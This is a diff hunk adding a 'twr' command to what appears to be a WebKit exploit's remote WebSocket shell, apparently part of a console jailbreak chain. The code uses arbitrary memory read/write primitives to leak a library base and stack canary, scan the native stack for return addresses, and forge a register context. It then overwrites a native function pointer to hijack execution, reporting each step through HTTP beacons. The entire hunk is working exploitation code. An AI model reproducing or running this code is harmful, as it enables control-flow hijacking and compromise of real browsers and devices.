@@ -5818,6 +5818,97 @@ function _startWsShell(){
         break;
       }
 
+      case 'twr':{
+        /* THE SURVIVABLE SETCONTEXT TEST: if the candidate stub is
+         * setcontext-class, the context swap jumps to MY rip/rsp.
+         * THE RETURN TRICK: scan [cfr-0x400, cfr-8) for the DEEPEST
+         * WebKit-text qword = the nativeCallTrampoline's return-
+         * address slot (pushed by the `call [a2+exeOff]`). Set
+         * ctx.rsp = that slot: the stub's ret pops it -> the return
+         * into the trampoline's POST-CALL path -> the epilogue pops
+         * the ORIGINAL saved rbp/caller-addr from the INTACT native
+         * stack -> THE JS SURVIVES -> the reply posts = THE
+         * SURVIVABLE FULL-REGISTER CONTEXT SWAP CONFIRMED.
+         * ctx.rbp = cfr (the post-call reads Callee[cfr]). */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function TR(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('TWR-'+s),true);x.send();}catch(e){}}
+        try{
+          var cfr=S.cfr;
+          if(!cfr||cfr<0x400000000n){reply.err='No cfr';break;}
+          /* the chain -> lk_base */
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          if(trPtr===0n){reply.err='no thread-record ptr';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          if(ptp===0n){reply.err='no pthread ptr';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p=S.absRead(node,0x60);
+            Q=p[8];
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='base unaligned';break;}
+          var can=S.absRead(B+0x751D0n,8)[0];
+          TR('1 B=0x'+B.toString(16)+' canary=0x'+can.toString(16));
+          if(!(can>0x1000000n)){reply.err='canary fail';break;}
+          reply.base='0x'+B.toString(16);
+          /* THE STACK SCAN: [cfr-0x400, cfr-8) for WebKit-text qwords */
+          var wb=S.BASE||0n;
+          var scan=S.absRead(cfr-0x400n,0x400);
+          var slots=[];
+          for(var si2=0;si2<scan.length;si2++){
+            var v2=scan[si2];
+            if(v2>wb&&v2<wb+0x7392000n){slots.push({addr:'0x'+(cfr-0x400n+BigInt(si2*8)).toString(16),val:'0x'+v2.toString(16)});}
+          }
+          reply.slots=slots;
+          TR('2 nslots='+slots.length);
+          if(slots.length===0){reply.err='no WebKit return slots found';break;}
+          /* the deepest = the LAST in the scan (lowest address = highest index
+           * from cfr-0x400... careful: the scan goes UP; the deepest slot =
+           * the LOWEST address = index 0 among the found) */
+          var retSlot=slots[0]; /* the lowest address = the most recent push */
+          var retSlotAddr=BigInt(retSlot.addr);
+          TR('3 retSlot='+retSlot.addr+' val='+retSlot.val);
+          reply.retSlot=retSlot;
+          /* the target: msg.rva (default 0x130) */
+          var rva=parseInt(msg.rva,16)||0x130;
+          var target=B+BigInt(rva);
+          TR('4 target=0x'+target.toString(16));
+          reply.target='lk+0x'+rva.toString(16);
+          /* the harmless stub for the jump */
+          var spinRva=parseInt(msg.spin,16)||0x7A0;
+          var spinStub=B+BigInt(spinRva);
+          /* build the ctx at the fakeScope */
+          for(var zi=0;zi<0x600/8;zi++)S.absWrite(S.fakeScope+BigInt(zi*8),0n);
+          S.absWrite(S.fakeScope+0x78n,cfr);        /* mc_rbp = cfr (the post-call reads Callee[cfr]) */
+          S.absWrite(S.fakeScope+0xE0n,spinStub);   /* mc_rip = the harmless stub */
+          S.absWrite(S.fakeScope+0xE8n,0x43n);      /* mc_cs */
+          S.absWrite(S.fakeScope+0xF0n,0x246n);     /* mc_rflags */
+          S.absWrite(S.fakeScope+0xF8n,retSlotAddr);/* mc_rsp = THE RETURN SLOT */
+          S.absWrite(S.fakeScope+0x100n,0x3Bn);     /* mc_ss */
+          TR('5 ctx built rip=0x'+spinStub.toString(16)+' rsp=slot');
+          /* THE CALL */
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var origFnR=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,target);
+          TR('6 CALLING');
+          try{Math.round(-5.7);}catch(e){}
+          TR('7 RETURNED - THE JS SURVIVED');
+          S.absWrite(S.neEntry.addr+0x28n,origFnR);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          reply.survived=true;
+          reply.verified=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR);
+          TR('8 RESTORED verified='+(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR));
+        }catch(e2){reply.err='twr fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'tw':{
         /* THE THREAD WITNESS (the game lane's 56l probe ported): the
          * thr_new candidate (export entry #msg.idx) called with a FULLY
